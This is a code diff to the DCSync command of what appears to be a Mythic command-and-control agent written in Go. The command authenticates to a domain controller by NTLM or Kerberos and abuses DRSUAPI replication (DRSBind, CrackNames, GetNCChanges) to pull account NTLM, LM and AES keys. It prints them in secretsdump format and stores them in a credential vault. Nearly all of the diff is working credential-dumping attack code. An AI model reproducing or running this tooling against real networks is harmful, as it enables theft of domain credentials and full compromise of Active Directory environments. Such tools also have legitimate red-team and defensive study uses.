@@ -1,7 +1,6 @@
 package commands
 
 import (
-	"context"
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
@@ -16,10 +15,8 @@ import (
 	"github.com/oiweiwei/go-msrpc/msrpc/drsr/drsuapi/v4"
 	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
 	"github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
-	"github.com/oiweiwei/go-msrpc/msrpc/erref/drsr"
 	"github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"
 	"github.com/oiweiwei/go-msrpc/ndr"
-	"github.com/oiweiwei/go-msrpc/ssp"
 	sspcred "github.com/oiweiwei/go-msrpc/ssp/credential"
 	"github.com/oiweiwei/go-msrpc/ssp/krb5"
 	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
@@ -114,16 +111,25 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: domain is required for Kerberos auth")
 	}
 
-	// Diagnostic removed — direct gokrb5 login passes but mechanism still fails.
-	// Keeping dcsyncKerberosDirectTest function for future debugging.
+	if !useKerberos {
+		return dcsyncExecuteNTLM(args, targets)
+	}
+	return dcsyncExecuteKerberos(args, targets)
+}
 
+func dcsyncExecuteNTLM(args dcsyncArgs, targets []string) structs.CommandResult {
+	results, err := dcsyncViaSubprocess(args, targets)
+	zeroCredentials(&args.Password, &args.Hash)
+	if err != nil {
+		return errorf("Error: %v", err)
+	}
+	return dcsyncFormatResults(args, targets, results, "NTLM")
+}
+
+func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandResult {
 	var credErr error
 	var cred sspcred.Credential
-	if useKerberos {
-		cred, credErr = rpcKerberosCredential(args.Username, args.Domain, args.Password, args.Hash)
-	} else {
-		cred, credErr = rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
-	}
+	cred, credErr = rpcKerberosCredential(args.Username, args.Domain, args.Password, args.Hash)
 	zeroCredentials(&args.Password, &args.Hash)
 	if credErr != nil {
 		return errorf("Error: %v", credErr)
@@ -131,64 +137,35 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 
 	timeout := time.Duration(args.Timeout) * time.Second
 
-	var cc dcerpc.Conn
-	var err error
-	var ctx context.Context
-	var cancel context.CancelFunc
-	var krbCfg *krb5.Config
-
-	if useKerberos {
-		ensureKRB5Mechanism()
-		krbCfg = rpcKerberosConfig(cred, args.Domain, args.Server)
-		ctx, cancel = rpcSecurityContext(cred, timeout)
-	} else {
-		ctx, cancel = context.WithTimeout(context.Background(), timeout)
-	}
+	ensureKRB5Mechanism()
+	krbCfg := rpcKerberosConfig(cred, args.Domain, args.Server)
+	ctx, cancel := rpcSecurityContext(cred, timeout)
 	defer cancel()
 
-	var dialOpts []dcerpc.Option
-	var clientOpts []dcerpc.Option
-	if useKerberos {
-		dialOpts = append(dialOpts,
-			epm.EndpointMapper(ctx,
-				net.JoinHostPort(args.Server, "135"),
-				dcerpc.WithInsecure(),
-			),
-		)
-		clientOpts = append(clientOpts,
-			dcerpc.WithSeal(),
-			dcerpc.WithTargetName("host/"+args.DCHost),
-			dcerpc.WithSecurityConfig(krbCfg),
-		)
-	} else {
-		dialOpts = append(dialOpts,
-			epm.EndpointMapper(ctx,
-				net.JoinHostPort(args.Server, "135"),
-				dcerpc.WithInsecure(),
-			),
-			dcerpc.WithCredentials(cred),
-			dcerpc.WithMechanism(ssp.NTLM),
-			dcerpc.WithSeal(),
-		)
-	}
-
-	cc, err = dcerpc.Dial(ctx, "ncacn_ip_tcp:"+args.Server, dialOpts...)
+	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+args.Server,
+		epm.EndpointMapper(ctx,
+			net.JoinHostPort(args.Server, "135"),
+			dcerpc.WithInsecure(),
+		),
+	)
 	if err != nil {
 		return errorf("Error connecting to %s via DCE-RPC: %v", args.Server, err)
 	}
 	defer cc.Close(ctx)
 
-	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, clientOpts...)
+	cli, err := drsuapi.NewDrsuapiClient(ctx, cc,
+		dcerpc.WithSeal(),
+		dcerpc.WithTargetName("host/"+args.DCHost),
+		dcerpc.WithSecurityConfig(krbCfg),
+	)
 	if err != nil {
 		return errorf("Error creating DRSUAPI client: %v", err)
 	}
 
-	// DRSBind
 	clientCaps := drsuapi.ExtensionsInt{
 		Flags:   drsuapi.ExtGetNCChangesRequestV8 | drsuapi.ExtStrongEncryption | drsuapi.ExtGetNCChangesReplyV6,
 		ExtCaps: 0xFFFFFFFF,
 	}
-
 	capsBytes, err := ndr.Marshal(&clientCaps, ndr.Opaque)
 	if err != nil {
 		return errorf("Error marshaling client capabilities: %v", err)
@@ -201,13 +178,9 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorf("Error DRSBind to %s: %v", args.Server, err)
 	}
 
-	// CrackNames — resolve target account names to GUIDs.
-	// If we have a domain, use NT4 format (NETBIOS\account) for unambiguous resolution
-	// in multi-domain forests. Otherwise use SansDomainEx (plain name, DC resolves locally).
 	var crackFormat uint32
 	crackTargets := make([]string, len(targets))
 	if args.Domain != "" {
-		// Derive NetBIOS domain from FQDN (first DNS label, uppercased)
 		netbios := strings.ToUpper(strings.SplitN(args.Domain, ".", 2)[0])
 		crackFormat = uint32(drsuapi.DSNameFormatNT4AccountName)
 		for i, t := range targets {
@@ -239,29 +212,12 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	if !ok || crackedReply == nil {
 		return errorResult("Error: unexpected DRSCrackNames response type")
 	}
-	items := crackedReply.Result.Items
 
-	var sb strings.Builder
-	authMethod := "NTLM"
-	if useKerberos {
-		authMethod = "Kerberos"
-	} else if args.Hash != "" {
-		authMethod = "PTH"
-	}
-	sb.WriteString(fmt.Sprintf("[*] DCSync via DRSGetNCChanges against %s (%s)\n", args.Server, authMethod))
-	sb.WriteString(fmt.Sprintf("[*] Credentials: %s\\%s\n", args.Domain, args.Username))
-	sb.WriteString(strings.Repeat("-", 60) + "\n")
-
-	successCount := 0
-	var creds []structs.MythicCredential
-
-	for i, item := range items {
+	var results []dcsyncResult
+	for i, item := range crackedReply.Result.Items {
 		if item.Status != 0 {
-			sb.WriteString(fmt.Sprintf("[!] %s — CrackNames failed: %v\n", targets[i], drsr.FromCode(int32(item.Status))))
 			continue
 		}
-
-		// GetNCChanges — replicate the object
 		nc, err := cli.GetNCChanges(ctx, &drsuapi.GetNCChangesRequest{
 			Handle:    bindResp.DRS,
 			InVersion: 8,
@@ -279,51 +235,59 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 			},
 		})
 		if err != nil {
-			sb.WriteString(fmt.Sprintf("[!] %s — GetNCChanges failed: %v\n", targets[i], err))
 			continue
 		}
-
-		result := dcsyncParseReply(cli, nc, targets[i])
-		if result != nil {
-			successCount++
-			sb.WriteString(fmt.Sprintf("\n[+] %s (RID: %d)\n", result.Username, result.RID))
-			if result.NTHash != "" {
-				sb.WriteString(fmt.Sprintf("    NTLM:   %s\n", result.NTHash))
-			}
-			if result.LMHash != "" && result.LMHash != "aad3b435b51404eeaad3b435b51404ee" {
-				sb.WriteString(fmt.Sprintf("    LM:     %s\n", result.LMHash))
-			}
-			if result.AES256Key != "" {
-				sb.WriteString(fmt.Sprintf("    AES256: %s\n", result.AES256Key))
-			}
-			if result.AES128Key != "" {
-				sb.WriteString(fmt.Sprintf("    AES128: %s\n", result.AES128Key))
-			}
-			// Secretsdump format line
-			lm := result.LMHash
-			if lm == "" {
-				lm = "aad3b435b51404eeaad3b435b51404ee"
-			}
-			nt := result.NTHash
-			if nt == "" {
-				nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
-			}
-			sb.WriteString(fmt.Sprintf("    Hash:   %s:%d:%s:%s:::\n", result.Username, result.RID, lm, nt))
-
-			// Report NTLM hash to Mythic credential vault
-			if result.NTHash != "" {
-				creds = append(creds, structs.MythicCredential{
-					CredentialType: "hash",
-					Realm:          args.Domain,
-					Account:        result.Username,
-					Credential:     fmt.Sprintf("%s:%d:%s:%s:::", result.Username, result.RID, lm, nt),
-					Comment:        "dcsync (DRSGetNCChanges)",
-				})
-			}
+		if r := dcsyncParseReply(cli, nc, targets[i]); r != nil {
+			results = append(results, *r)
 		}
 	}
 
-	sb.WriteString(fmt.Sprintf("\n[*] %d/%d accounts dumped successfully\n", successCount, len(targets)))
+	return dcsyncFormatResults(args, targets, results, "Kerberos")
+}
+
+func dcsyncFormatResults(args dcsyncArgs, targets []string, results []dcsyncResult, authMethod string) structs.CommandResult {
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("[*] DCSync via DRSGetNCChanges against %s (%s)\n", args.Server, authMethod))
+	sb.WriteString(fmt.Sprintf("[*] Credentials: %s\\%s\n", args.Domain, args.Username))
+	sb.WriteString(strings.Repeat("-", 60) + "\n")
+
+	var creds []structs.MythicCredential
+	for _, result := range results {
+		sb.WriteString(fmt.Sprintf("\n[+] %s (RID: %d)\n", result.Username, result.RID))
+		if result.NTHash != "" {
+			sb.WriteString(fmt.Sprintf("    NTLM:   %s\n", result.NTHash))
+		}
+		if result.LMHash != "" && result.LMHash != "aad3b435b51404eeaad3b435b51404ee" {
+			sb.WriteString(fmt.Sprintf("    LM:     %s\n", result.LMHash))
+		}
+		if result.AES256Key != "" {
+			sb.WriteString(fmt.Sprintf("    AES256: %s\n", result.AES256Key))
+		}
+		if result.AES128Key != "" {
+			sb.WriteString(fmt.Sprintf("    AES128: %s\n", result.AES128Key))
+		}
+		lm := result.LMHash
+		if lm == "" {
+			lm = "aad3b435b51404eeaad3b435b51404ee"
+		}
+		nt := result.NTHash
+		if nt == "" {
+			nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
+		}
+		sb.WriteString(fmt.Sprintf("    Hash:   %s:%d:%s:%s:::\n", result.Username, result.RID, lm, nt))
+
+		if result.NTHash != "" {
+			creds = append(creds, structs.MythicCredential{
+				CredentialType: "hash",
+				Realm:          args.Domain,
+				Account:        result.Username,
+				Credential:     fmt.Sprintf("%s:%d:%s:%s:::", result.Username, result.RID, lm, nt),
+				Comment:        "dcsync (DRSGetNCChanges)",
+			})
+		}
+	}
+
+	sb.WriteString(fmt.Sprintf("\n[*] %d/%d accounts dumped successfully\n", len(results), len(targets)))
 
 	cmdResult := structs.CommandResult{
 		Output:    sb.String(),
